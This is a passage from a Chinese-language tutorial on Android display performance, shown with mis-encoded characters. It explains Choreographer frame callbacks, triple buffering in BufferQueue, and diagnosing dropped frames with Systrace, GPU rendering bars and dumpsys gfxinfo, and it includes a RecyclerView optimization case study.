                    + <span class="hljs-string">"The application may be doing too much work on its main thread."</span>);
        }

        <span class="hljs-comment">// è®°å½•åˆ°FrameMetrics,ä¾›æ€§èƒ½åˆ†æ</span>
        mFrameMetrics.addJank(skippedFrames);
    }
}
</code></pre>
<p>åº”ç”¨å¯ä»¥é€šè¿‡<code>Window.addOnFrameMetricsAvailableListener()</code>ç›‘å¬æ‰å¸§äº‹ä»¶:</p>
<pre><code class="hljs language-java" lang="java">window.addOnFrameMetricsAvailableListener(
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Window</span>.OnFrameMetricsAvailableListener() {
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onFrameMetricsAvailable</span><span class="hljs-params">(Window window, FrameMetrics frameMetrics, <span class="hljs-type">int</span> dropCountSinceLastInvocation)</span> {
            <span class="hljs-comment">// frameMetricsåŒ…å«è¯¦ç»†çš„å¸§è€—æ—¶æ•°æ®</span>
            <span class="hljs-type">long</span> <span class="hljs-variable">totalDuration</span> <span class="hljs-operator">=</span> frameMetrics.getMetric(FrameMetrics.TOTAL_DURATION);
            <span class="hljs-keyword">if</span> (totalDuration &gt; <span class="hljs-number">16_000_000</span>) {  <span class="hljs-comment">// 16ms in nanoseconds</span>
                Log.w(TAG, <span class="hljs-string">"Slow frame detected: "</span> + totalDuration / <span class="hljs-number">1_000_000</span> + <span class="hljs-string">"ms"</span>);
            }
        }
    },
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Handler</span>(Looper.getMainLooper())
);
</code></pre>
<blockquote>
<p><strong>æ€§èƒ½ä¼˜åŒ–æç¤º</strong>:</p>
<ul>
<li>Choreographerçš„å›è°ƒæ‰§è¡Œåœ¨UIçº¿ç¨‹,å¿…é¡»å¿«é€Ÿå®Œæˆ(&lt; 16ms)</li>
<li>è€—æ—¶æ“ä½œåº”æ”¾åˆ°åå°çº¿ç¨‹æˆ–RenderThread</li>
<li>ä½¿ç”¨<code>postFrameCallback</code>å¯ä»¥ç²¾ç¡®æ§åˆ¶åŠ¨ç”»æ‰§è¡Œæ—¶æœº</li>
</ul>
</blockquote>
<h2 data-id="heading-20">ä¸‰ã€ä¸‰é‡ç¼“å†²ä¸å¸§ç‡ä¼˜åŒ–</h2>
<h3 data-id="heading-21">3.1 åŒç¼“å†²çš„å±€é™æ€§</h3>
<p>åœ¨ç†è§£ä¸‰é‡ç¼“å†²ä¹‹å‰,å…ˆçœ‹çœ‹åŒç¼“å†²ä¸ºä»€ä¹ˆä¸å¤Ÿç”¨ã€‚</p>
<p><strong>åŒç¼“å†²æ¨¡å‹</strong>:</p>
<ul>
<li>Buffer A: å½“å‰Displayæ­£åœ¨æ‰«ææ˜¾ç¤º</li>
<li>Buffer B: App/GPUæ­£åœ¨ç»˜åˆ¶</li>
</ul>
<p><strong>é—®é¢˜åœºæ™¯</strong>:</p>
<p>å‡è®¾Appç»˜åˆ¶ä¸€å¸§éœ€è¦15ms(æ¥è¿‘16msçš„é™åˆ¶):</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">Vsync</span> <span class="hljs-number">0</span> (T0):
  <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">Display</span>: æ˜¾ç¤º<span class="hljs-selector-tag">Buffer</span> <span class="hljs-selector-tag">A</span>
  <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">App</span>: ç»˜åˆ¶<span class="hljs-selector-tag">Buffer</span> <span class="hljs-selector-tag">B</span> (è€—æ—¶<span class="hljs-number">15ms</span>)

<span class="hljs-selector-tag">Vsync</span> <span class="hljs-number">1</span> (T16ms):
  <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">Display</span>: æ˜¾ç¤º<span class="hljs-selector-tag">Buffer</span> <span class="hljs-selector-tag">B</span> (åˆšå®Œæˆçš„)
  <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">App</span>: æƒ³ç»˜åˆ¶<span class="hljs-selector-tag">Buffer</span> <span class="hljs-selector-tag">A</span>,ä½†<span class="hljs-selector-tag">A</span>è¿˜åœ¨è¢«<span class="hljs-selector-tag">Display</span>ä½¿ç”¨ âŒ
  <span class="hljs-selector-tag">-</span> ç»“æœ: <span class="hljs-selector-tag">App</span>é˜»å¡ç­‰å¾…,è¿™ä¸€å¸§æ‰äº†

<span class="hljs-selector-tag">Vsync</span> <span class="hljs-number">2</span> (T32ms):
  <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">Display</span>: è¿˜åœ¨æ˜¾ç¤º<span class="hljs-selector-tag">Buffer</span> <span class="hljs-selector-tag">B</span> (å› ä¸ºæ²¡æœ‰æ–°å†…å®¹)
  <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">App</span>: <span class="hljs-selector-tag">Buffer</span> <span class="hljs-selector-tag">A</span>è¢«é‡Šæ”¾,å¼€å§‹ç»˜åˆ¶
</code></pre>
<p><strong>é—®é¢˜æ ¹æº</strong>: åªæœ‰2ä¸ªBuffer,ä½†éœ€è¦3ä¸ªè§’è‰²åŒæ—¶ä½¿ç”¨:</p>
<ol>
<li>Displayæ­£åœ¨æ˜¾ç¤ºä¸€ä¸ª</li>
<li>SurfaceFlingeræ­£åœ¨åˆæˆä¸€ä¸ª</li>
<li>Appæƒ³è¦ç»˜åˆ¶ä¸€ä¸ª</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b026351ae3144691a7c2e3b550f173c7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769434385&amp;x-signature=z8ofMIaTYgJFtuOju41%2FvnZ0GMw%3D" alt="03-03-double-vs-triple-buffering.png" loading="lazy"/></p>
<h3 data-id="heading-22">3.2 ä¸‰é‡ç¼“å†²çš„å¼•å…¥</h3>
<p>ä¸‰é‡ç¼“å†²å¢åŠ äº†ç¬¬ä¸‰ä¸ªBuffer,è§£å†³äº†ä¸Šè¿°é—®é¢˜:</p>
<p><strong>ä¸‰é‡ç¼“å†²æ¨¡å‹</strong>:</p>
<ul>
<li>Buffer A: Displayæ­£åœ¨æ˜¾ç¤º</li>
<li>Buffer B: SurfaceFlingeræ­£åœ¨åˆæˆ</li>
<li>Buffer C: Appå¯ä»¥è‡ªç”±ç»˜åˆ¶</li>
</ul>
<p><strong>ä¼˜åŒ–åçš„æ—¶åº</strong>:</p>
<pre><code class="hljs language-markdown" lang="markdown">Vsync 0 (T0):
<span class="hljs-bullet">  -</span> Display: æ˜¾ç¤ºBuffer A
<span class="hljs-bullet">  -</span> SurfaceFlinger: åˆæˆBuffer B
<span class="hljs-bullet">  -</span> App: ç»˜åˆ¶Buffer C âœ“

Vsync 1 (T16ms):
<span class="hljs-bullet">  -</span> Display: æ˜¾ç¤ºBuffer B
<span class="hljs-bullet">  -</span> SurfaceFlinger: åˆæˆBuffer C
<span class="hljs-bullet">  -</span> App: ç»˜åˆ¶Buffer A âœ“ (å·²è¢«Displayé‡Šæ”¾)

Vsync 2 (T32ms):
<span class="hljs-bullet">  -</span> Display: æ˜¾ç¤ºBuffer C
<span class="hljs-bullet">  -</span> SurfaceFlinger: åˆæˆBuffer A
<span class="hljs-bullet">  -</span> App: ç»˜åˆ¶Buffer B âœ“
</code></pre>
<p><strong>ä¼˜åŠ¿</strong>:</p>
<ul>
<li>âœ“ Appå§‹ç»ˆæœ‰å¯ç”¨Buffer,æ— éœ€ç­‰å¾…</li>
<li>âœ“ 100%çš„Vsyncåˆ©ç”¨ç‡,æµç•…åº¦å¤§å¹…æå‡</li>
<li>âœ“ å³ä½¿å¶å°”è¶…è¿‡16ms,ä¹Ÿèƒ½å¿«é€Ÿæ¢å¤</li>
</ul>
<p><strong>ä»£ä»·</strong>:</p>
<ul>
<li>âš  å†…å­˜å ç”¨å¢åŠ 33% (3ä¸ªBuffer vs 2ä¸ª)</li>
<li>âš  å»¶è¿Ÿå¢åŠ 1å¸§ (ä»è¾“å…¥åˆ°æ˜¾ç¤ºçš„å»¶è¿Ÿ)</li>
</ul>
<h3 data-id="heading-23">3.3 BufferQueueçš„maxAcquiredBufferCount</h3>
<p>ä¸‰é‡ç¼“å†²é€šè¿‡é…ç½®BufferQueueçš„maxAcquiredBufferCountå®ç°:</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// frameworks/native/libs/gui/BufferQueueProducer.cpp</span>
<span class="hljs-function"><span class="hljs-type">status_t</span> <span class="hljs-title">BufferQueueProducer::setMaxDequeuedBufferCount</span><span class="hljs-params">(<span class="hljs-type">int</span> maxDequeuedBuffers)</span> </span>{
    <span class="hljs-comment">// maxDequeuedBuffers = 2: åŒç¼“å†² (Appæœ€å¤šæŒæœ‰2ä¸ªBuffer)</span>
    <span class="hljs-comment">// maxDequeuedBuffers = 3: ä¸‰é‡ç¼“å†² (Appæœ€å¤šæŒæœ‰3ä¸ªBuffer)</span>

    <span class="hljs-keyword">if</span> (maxDequeuedBuffers &lt; <span class="hljs-number">1</span> || maxDequeuedBuffers &gt; BufferQueueDefs::NUM_BUFFER_SLOTS - <span class="hljs-number">1</span>) {
        <span class="hljs-keyword">return</span> BAD_VALUE;
    }

    <span class="hljs-function">std::lock_guard&lt;std::mutex&gt; <span class="hljs-title">lock</span><span class="hljs-params">(mCore-&gt;mMutex)</span></span>;
    mCore-&gt;mMaxDequeuedBufferCount = maxDequeuedBuffers;
    <span class="hljs-keyword">return</span> NO_ERROR;
}
</code></pre>
<p><strong>é»˜è®¤é…ç½®</strong> (Android 15):</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// frameworks/native/services/surfaceflinger/SurfaceFlinger.cpp</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SurfaceFlinger::setUpHWComposer</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-comment">// é»˜è®¤ä¸‰é‡ç¼“å†²</span>
    mMaxAcquiredBufferCount = <span class="hljs-number">3</span>;
}
</code></pre>
<blockquote>
<p><strong>å†…å­˜å ç”¨æƒè¡¡</strong>:</p>
<ul>
<li>1080p RGBA_8888 Buffer: çº¦8MB</li>
<li>ä¸‰é‡ç¼“å†²é¢å¤–å¼€é”€: 8MB</li>
<li>å¯¹äºç°ä»£æ‰‹æœº(8GB+ RAM),è¿™ä¸ªå¼€é”€å¯ä»¥æ¥å—</li>
</ul>
</blockquote>
<h3 data-id="heading-24">3.4 Android 15çš„BufferQueueä¼˜åŒ–</h3>
<p>Android 15è¿›ä¸€æ­¥ä¼˜åŒ–äº†BufferQueue:</p>
<p><strong>1. åŠ¨æ€ç¼“å†²åŒºæ•°é‡è°ƒæ•´</strong></p>
<p>æ ¹æ®åœºæ™¯åŠ¨æ€è°ƒæ•´Bufferæ•°é‡:</p>
<ul>
<li>é™æ€å†…å®¹: ä½¿ç”¨2ä¸ªBuffer,èŠ‚çœå†…å­˜</li>
<li>åŠ¨ç”»/æ»‘åŠ¨: ä½¿ç”¨3ä¸ªBuffer,ä¿è¯æµç•…</li>
<li>é‡åº¦æ¸¸æˆ: å¯é…ç½®4ä¸ªBuffer (é€šè¿‡<code>setMaxDequeuedBufferCount(4)</code>)</li>
</ul>
<p><strong>2. æ›´æ™ºèƒ½çš„Bufferé‡Šæ”¾ç­–ç•¥</strong></p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// å½“Bufferåœ¨é˜Ÿåˆ—ä¸­åœç•™è¿‡ä¹…,ä¸»åŠ¨é‡Šæ”¾</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">BufferQueueCore::releaseOldBuffers</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-type">const</span> <span class="hljs-type">nsecs_t</span> now = <span class="hljs-built_in">systemTime</span>();
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; slot : mSlots) {
        <span class="hljs-keyword">if</span> (slot.mBufferState == BufferSlot::ACQUIRED &amp;&amp;
            now - slot.mAcquiredTime &gt; kMaxAcquiredBufferAge) {
            <span class="hljs-comment">// è¶…è¿‡é˜ˆå€¼(å¦‚500ms),ä¸»åŠ¨é‡Šæ”¾</span>
            <span class="hljs-built_in">releaseBuffer</span>(slot);
        }
    }
}
</code></pre>
<p><strong>3. å¸§ç‡æ„ŸçŸ¥çš„Bufferç®¡ç†</strong></p>
<p>VRRåœºæ™¯ä¸‹,æ ¹æ®å½“å‰å¸§ç‡åŠ¨æ€è°ƒæ•´Bufferè¶…æ—¶æ—¶é—´:</p>
<ul>
<li>60Hz: è¶…è¿‡33msæœªä½¿ç”¨çš„Bufferé‡Šæ”¾</li>
<li>30Hz: è¶…è¿‡66msæœªä½¿ç”¨çš„Bufferé‡Šæ”¾</li>
</ul>
<h2 data-id="heading-25">å››ã€æ˜¾ç¤ºæ€§èƒ½é—®é¢˜è¯Šæ–­å®æˆ˜</h2>
<h3 data-id="heading-26">4.1 å¸¸è§æ€§èƒ½é—®é¢˜ç±»å‹</h3>
<p>åœ¨å®é™…å¼€å‘ä¸­,æ˜¾ç¤ºæ€§èƒ½é—®é¢˜ä¸»è¦åˆ†ä¸ºä¸‰å¤§ç±»:</p>
<p><strong>1. UI Threadè€—æ—¶</strong></p>
<ul>
<li>ç—‡çŠ¶: ä¸»çº¿ç¨‹æ‰§è¡Œæ—¶é—´è¿‡é•¿,å¯¼è‡´æ— æ³•åŠæ—¶å“åº”Vsync</li>
<li>åŸå› :
<ul>
<li>è¿‡åº¦ç»˜åˆ¶(Overdraw)</li>
<li>å¸ƒå±€å±‚çº§è¿‡æ·±</li>
<li>ä¸»çº¿ç¨‹æ‰§è¡Œè€—æ—¶æ“ä½œ(ç½‘ç»œ/IO/å¤æ‚è®¡ç®—)</li>
</ul>
</li>
</ul>
<p><strong>2. RenderThreadè€—æ—¶</strong></p>
<ul>
<li>ç—‡çŠ¶: GPUæ¸²æŸ“é€Ÿåº¦è·Ÿä¸ä¸Š</li>
<li>åŸå› :
<ul>
<li>å¤æ‚Shaderè®¡ç®—</li>
<li>å¤§é‡çº¹ç†ä¸Šä¼ </li>
<li>Alphaæ··åˆè¿‡å¤š</li>
</ul>
</li>
</ul>
<p><strong>3. SurfaceFlingerè€—æ—¶</strong></p>
<ul>
<li>ç—‡çŠ¶: ç³»ç»Ÿåˆæˆå»¶è¿Ÿ</li>
<li>åŸå› :
<ul>
<li>Layeræ•°é‡è¿‡å¤š(&gt; 30ä¸ª)</li>
<li>ç¡¬ä»¶Overlayèµ„æºä¸è¶³,å¤§é‡CLIENTåˆæˆ</li>
<li>HWCåˆæˆç­–ç•¥ä¸ä½³</li>
</ul>
</li>
</ul>
<h3 data-id="heading-27">4.2 å·¥å…·é“¾ä½¿ç”¨</h3>
<h4 data-id="heading-28">Systraceåˆ†æVsync/SurfaceFlinger/RenderThread</h4>
<p><strong>Systrace</strong>æ˜¯Androidæœ€å¼ºå¤§çš„æ€§èƒ½åˆ†æå·¥å…·,å¯ä»¥å®Œæ•´å±•ç¤ºæ¸²æŸ“ç®¡çº¿çš„æ¯ä¸ªç¯èŠ‚ã€‚</p>
<p><strong>æŠ“å–trace</strong>:</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŠ“å–5ç§’çš„trace,å…³æ³¨graphics/view/sched/freq</span>
python systrace.py gfx view <span class="hljs-built_in">sched</span> freq -b 32768 -t 5 -o trace.html

<span class="hljs-comment"># å‚æ•°è¯´æ˜:</span>
<span class="hljs-comment"># gfx: Graphicsç›¸å…³äº‹ä»¶(SurfaceFlinger/HWC/BufferQueue)</span>
<span class="hljs-comment"># view: Viewç³»ç»Ÿäº‹ä»¶(measure/layout/draw)</span>
<span class="hljs-comment"># sched: çº¿ç¨‹è°ƒåº¦äº‹ä»¶</span>
<span class="hljs-comment"># freq: CPUé¢‘ç‡å˜åŒ–</span>
<span class="hljs-comment"># -b 32768: bufferå¤§å°32MB,é¿å…æ•°æ®ä¸¢å¤±</span>
<span class="hljs-comment"># -t 5: æŠ“å–5ç§’</span>
</code></pre>
<p><strong>åˆ†æå…³é”®Track</strong>:</p>
<ol>
<li>
<p><strong>surfaceflinger Track</strong></p>
<ul>
<li>æŸ¥çœ‹<code>onMessageReceived</code>: åˆæˆå¾ªç¯è§¦å‘</li>
<li>æŸ¥çœ‹<code>handleMessageRefresh</code>: å®é™…åˆæˆè€—æ—¶</li>
<li>ç›®æ ‡: &lt; 2ms</li>
</ul>
</li>
<li>
<p><strong>UI Thread Track</strong> (åº”ç”¨ä¸»çº¿ç¨‹)</p>
<ul>
<li>æŸ¥çœ‹<code>Choreographer#doFrame</code>: æ˜¯å¦åŠæ—¶å“åº”Vsync</li>
<li>æŸ¥çœ‹<code>performTraversals</code>: measure/layout/drawè€—æ—¶</li>
<li>æŸ¥çœ‹<code>draw</code>: æ˜¯å¦æœ‰æ…¢é€ŸView</li>
<li>ç›®æ ‡: &lt; 10ms</li>
</ul>
</li>
<li>
<p><strong>RenderThread Track</strong></p>
<ul>
<li>æŸ¥çœ‹<code>syncFrameState</code>: DisplayListåŒæ­¥</li>
<li>æŸ¥çœ‹<code>flush drawing commands</code>: GPUå‘½ä»¤æäº¤</li>
<li>ç›®æ ‡: &lt; 4ms</li>
</ul>
</li>
</ol>
<p><strong>å…¸å‹é—®é¢˜pattern</strong>:</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">Pattern 1:</span> <span class="hljs-string">UI</span> <span class="hljs-string">Threadé˜»å¡</span>
<span class="hljs-string">------------------------------------------------------------</span>
<span class="hljs-attr">UI Thread:</span>  <span class="hljs-string">|=======doFrame(20ms)========|</span>  <span class="hljs-string">âŒ</span> <span class="hljs-string">è¶…è¿‡16ms</span>
<span class="hljs-attr">RenderThread:</span>         [<span class="hljs-string">idle</span>]
<span class="hljs-attr">SurfaceFlinger:</span>       [<span class="hljs-string">idle</span>]
<span class="hljs-string">â†’</span> <span class="hljs-string">é—®é¢˜:</span> <span class="hljs-string">UI</span> <span class="hljs-string">Threadè€—æ—¶è¿‡é•¿,æ£€æŸ¥æ˜¯å¦æœ‰è€—æ—¶Viewæˆ–ä¸»çº¿ç¨‹IO</span>

<span class="hljs-attr">Pattern 2:</span> <span class="hljs-string">RenderThreadæ…¢</span>
<span class="hljs-string">------------------------------------------------------------</span>
<span class="hljs-attr">UI Thread:</span>  <span class="hljs-string">|==doFrame(8ms)==|</span>
<span class="hljs-attr">RenderThread:</span>        <span class="hljs-string">|========flush(15ms)=========|</span>  <span class="hljs-string">âŒ</span>
<span class="hljs-attr">SurfaceFlinger:</span>             [<span class="hljs-string">waiting</span>]
<span class="hljs-string">â†’</span> <span class="hljs-string">é—®é¢˜:</span> <span class="hljs-string">GPUæ¸²æŸ“æ…¢,æ£€æŸ¥Overdrawå’ŒShaderå¤æ‚åº¦</span>

<span class="hljs-attr">Pattern 3:</span> <span class="hljs-string">æ‰å¸§(Jank)</span>
<span class="hljs-string">------------------------------------------------------------</span>
<span class="hljs-attr">Vsync 0:</span>  <span class="hljs-string">Appç»˜åˆ¶</span>
<span class="hljs-attr">Vsync 1:</span>  <span class="hljs-string">Appç»˜åˆ¶å®Œæˆ</span> <span class="hljs-string">â†’</span> <span class="hljs-string">SFåˆæˆ</span> <span class="hljs-string">â†’</span> <span class="hljs-string">Display</span>
<span class="hljs-attr">Vsync 2:</span>  [<span class="hljs-string">æ²¡æœ‰æ–°å†…å®¹</span>,<span class="hljs-string">Displayé‡å¤ä¸Šä¸€å¸§</span>]  <span class="hljs-string">âŒ</span> <span class="hljs-string">Jank</span>
<span class="hljs-string">â†’</span> <span class="hljs-string">é—®é¢˜:</span> <span class="hljs-string">Appè¶…è¿‡1ä¸ªVsyncå‘¨æœŸæ‰å®Œæˆç»˜åˆ¶</span>
</code></pre>
<h4 data-id="heading-29">GPUå‘ˆç°æ¨¡å¼åˆ†æ</h4>
<p>GPUå‘ˆç°æ¨¡å¼æ˜¯å¿«é€Ÿå®šä½é—®é¢˜çš„åˆ©å™¨:</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å¼€å¯GPUå‘ˆç°æ¡å½¢å›¾</span>
adb shell setprop debug.hwui.profile <span class="hljs-literal">true</span>

<span class="hljs-comment"># æˆ–è€…é€šè¿‡è®¾ç½®ç•Œé¢</span>
è®¾ç½® â†’ å¼€å‘è€…é€‰é¡¹ â†’ GPUå‘ˆç°æ¨¡å¼åˆ†æ â†’ åœ¨å±å¹•ä¸Šæ˜¾ç¤ºä¸ºæ¡å½¢å›¾
</code></pre>
<p><strong>æ¡å½¢å›¾è§£è¯»</strong>:</p>
<p>æ¯æ ¹æŸ±å­ä»£è¡¨ä¸€å¸§,ä»ä¸‹åˆ°ä¸Šåˆ†ä¸ºå¤šæ®µ,é¢œè‰²å«ä¹‰:</p>
<ul>
<li><strong>ç»¿è‰²</strong>(swap buffers): Buffer swapæ—¶é—´</li>
<li><strong>è“è‰²</strong>(command issue): GPUå‘½ä»¤æäº¤</li>
<li><strong>çº¢è‰²</strong>(sync &amp; upload): çº¹ç†ä¸Šä¼ å’ŒåŒæ­¥</li>
<li><strong>æ©™è‰²</strong>(measure/layout): æµ‹é‡å’Œå¸ƒå±€</li>
<li><strong>è“è‰²</strong>(animation): åŠ¨ç”»è®¡ç®—</li>
<li><strong>çº¢è‰²</strong>(input handling): è¾“å…¥äº‹ä»¶å¤„ç†</li>
<li><strong>æ©™è‰²</strong>(misc/vsync delay): å…¶ä»–æ‚é¡¹</li>
</ul>
<p><strong>åˆ¤æ–­æ ‡å‡†</strong>:</p>
<ul>
<li>ç»¿è‰²æ¨ªçº¿: 16msé˜ˆå€¼(60fps)</li>
<li>æŸ±å­è¶…è¿‡ç»¿çº¿: æ‰å¸§</li>
<li>æŸ±å­è¿‡é«˜: ä¸¥é‡æ€§èƒ½é—®é¢˜</li>
</ul>
<h4 data-id="heading-30">dumpsys gfxinfo</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŸ¥çœ‹æŒ‡å®šåº”ç”¨çš„å¸§ç‡ç»Ÿè®¡</span>
adb shell dumpsys gfxinfo &lt;package_name&gt;

<span class="hljs-comment"># æŸ¥çœ‹æœ€è¿‘120å¸§çš„è¯¦ç»†æ•°æ®</span>
adb shell dumpsys gfxinfo &lt;package_name&gt; framestats
</code></pre>
<p><strong>å…³é”®æŒ‡æ ‡</strong>:</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">Stats since:</span> <span class="hljs-string">512345678ns</span>
<span class="hljs-attr">Total frames rendered:</span> <span class="hljs-number">1543</span>
<span class="hljs-attr">Janky frames:</span> <span class="hljs-number">89</span> <span class="hljs-string">(5.77%)</span>
<span class="hljs-attr">90th percentile:</span> <span class="hljs-string">14ms</span>
<span class="hljs-attr">95th percentile:</span> <span class="hljs-string">18ms</span>
<span class="hljs-attr">99th percentile:</span> <span class="hljs-string">26ms</span>

<span class="hljs-attr">Number Missed Vsync:</span> <span class="hljs-number">23</span>
<span class="hljs-attr">Number High input latency:</span> <span class="hljs-number">5</span>
<span class="hljs-attr">Number Slow UI thread:</span> <span class="hljs-number">34</span>
<span class="hljs-attr">Number Slow bitmap uploads:</span> <span class="hljs-number">8</span>
<span class="hljs-attr">Number Slow draw:</span> <span class="hljs-number">12</span>
</code></pre>
<p><strong>æŒ‡æ ‡å«ä¹‰</strong>:</p>
<ul>
<li>Janky frames: æ‰å¸§æ•°é‡å’Œæ¯”ä¾‹,ç›®æ ‡&lt; 1%</li>
<li>90th/95th/99th percentile: å¸§æ—¶é—´åˆ†ä½æ•°,90th &lt; 16msä¸ºä¼˜ç§€</li>
<li>Missed Vsync: æœªèƒ½åŠæ—¶å“åº”Vsyncçš„æ¬¡æ•°</li>
<li>Slow UI thread: UIçº¿ç¨‹è¶…æ—¶æ¬¡æ•°</li>
</ul>
<h3 data-id="heading-31">4.3 æ¡ˆä¾‹1: ä¸¢å¸§é—®é¢˜å®šä½ä¸ä¼˜åŒ–</h3>
<p><strong>é—®é¢˜ç°è±¡</strong>:
ç”¨æˆ·åé¦ˆæŸRecyclerViewæ»‘åŠ¨æ—¶æ˜æ˜¾å¡é¡¿ã€‚</p>
<p><strong>æ­¥éª¤1: GPUå‘ˆç°æ¨¡å¼å¿«é€Ÿæ£€æŸ¥</strong></p>
<p>å¼€å¯GPUå‘ˆç°æ¡å½¢å›¾,æ»‘åŠ¨åˆ—è¡¨,è§‚å¯Ÿåˆ°:</p>
<ul>
<li>å¾ˆå¤šæŸ±å­è¶…è¿‡ç»¿çº¿(16ms)</li>
<li>æ©™è‰²éƒ¨åˆ†(measure/layout)ç‰¹åˆ«é•¿</li>
</ul>
<p><strong>æ­¥éª¤2: Systraceæ·±åº¦åˆ†æ</strong></p>
<pre><code class="hljs language-bash" lang="bash">python systrace.py gfx view -b 32768 -t 5 -o trace.html
</code></pre>
<p>æ‰“å¼€trace.html,æ‰¾åˆ°UI Threadçš„doFrame:</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">UI</span> <span class="hljs-selector-tag">Thread</span>:
  <span class="hljs-selector-tag">Choreographer</span><span class="hljs-selector-id">#doFrame</span>                <span class="hljs-selector-attr">[16.2ms]</span>
    â”œâ”€ <span class="hljs-selector-tag">CALLBACK_INPUT</span>                  <span class="hljs-selector-attr">[0.3ms]</span>
    â”œâ”€ <span class="hljs-selector-tag">CALLBACK_ANIMATION</span>              <span class="hljs-selector-attr">[0.5ms]</span>
    â””â”€ <span class="hljs-selector-tag">CALLBACK_TRAVERSAL</span>              <span class="hljs-selector-attr">[15.4ms]</span>  âŒ è¶…æ—¶
        â””â”€ <span class="hljs-selector-tag">ViewRootImpl</span><span class="hljs-selector-class">.performTraversals</span>
            â”œâ”€ <span class="hljs-selector-tag">performMeasure</span>          <span class="hljs-selector-attr">[12.1ms]</span>  âŒ æ…¢
            â”‚   â””â”€ <span class="hljs-selector-tag">RecyclerView</span><span class="hljs-selector-class">.measure</span>
            â”‚       â””â”€ <span class="hljs-selector-tag">LinearLayoutManager</span><span class="hljs-selector-class">.onMeasure</span>
            â”‚           â””â”€ éå†æ‰€æœ‰<span class="hljs-selector-tag">child</span>,æ¯ä¸ª<span class="hljs-selector-tag">child</span> <span class="hljs-number">0.5ms</span> Ã— <span class="hljs-number">25</span>ä¸ª = <span class="hljs-number">12.5ms</span>
            â”œâ”€ <span class="hljs-selector-tag">performLayout</span>           <span class="hljs-selector-attr">[2.8ms]</span>
            â””â”€ <span class="hljs-selector-tag">performDraw</span>             <span class="hljs-selector-attr">[0.5ms]</span>
</code></pre>
<p><strong>æ ¹æœ¬åŸå› </strong>: RecyclerViewçš„æ¯ä¸ªitemå¸ƒå±€å±‚çº§è¿‡æ·±,å¯¼è‡´measureè€—æ—¶è¿‡é•¿ã€‚</p>
<p><strong>ä¼˜åŒ–æ–¹æ¡ˆ</strong>:</p>
<ol>
<li>ä½¿ç”¨ConstraintLayoutæ‰å¹³åŒ–itemå¸ƒå±€:</li>
</ol>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- ä¼˜åŒ–å‰: 3å±‚åµŒå¥— --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">RelativeLayout</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">ImageView</span>/&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span>/&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">RelativeLayout</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span>

<span class="hljs-comment">&lt;!-- ä¼˜åŒ–å: 1å±‚ConstraintLayout --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">androidx.constraintlayout.widget.ConstraintLayout</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">ImageView</span> <span class="hljs-attr">app:layout_constraintTop_toTopOf</span>=<span class="hljs-string">"parent"</span>/&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span> <span class="hljs-attr">app:layout_constraintTop_toBottomOf</span>=<span class="hljs-string">"@id/image"</span>/&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">androidx.constraintlayout.widget.ConstraintLayout</span>&gt;</span>
</code></pre>
<ol start="2">
<li>é¿å…åœ¨onBindViewHolderä¸­æ‰§è¡Œå¤æ‚è®¡ç®—:</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¼˜åŒ–å‰</span>
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onBindViewHolder</span><span class="hljs-params">(ViewHolder holder, <span class="hljs-type">int</span> position)</span> {
    <span class="hljs-type">Data</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> items.get(position);
    holder.textView.setText(formatData(data));  <span class="hljs-comment">// æ¯æ¬¡bindéƒ½è®¡ç®—</span>
}

<span class="hljs-comment">// ä¼˜åŒ–å</span>
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onBindViewHolder</span><span class="hljs-params">(ViewHolder holder, <span class="hljs-type">int</span> position)</span> {
